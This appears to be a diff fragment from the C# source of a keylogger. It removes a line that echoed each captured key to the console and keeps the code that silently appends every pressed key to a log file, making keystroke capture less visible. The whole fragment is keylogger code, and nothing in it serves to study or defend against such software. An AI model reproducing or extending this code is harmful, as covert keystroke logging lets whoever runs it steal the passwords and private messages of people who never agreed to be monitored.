@@ -119,7 +119,6 @@ namespace KeyLogger
                 }
                 else
                 {
-                    Console.Write(pressedKey);
                     StreamWriter output = new StreamWriter(logFileLocation + logFileName, true);
                     output.Write(pressedKey);
                     output.Close();
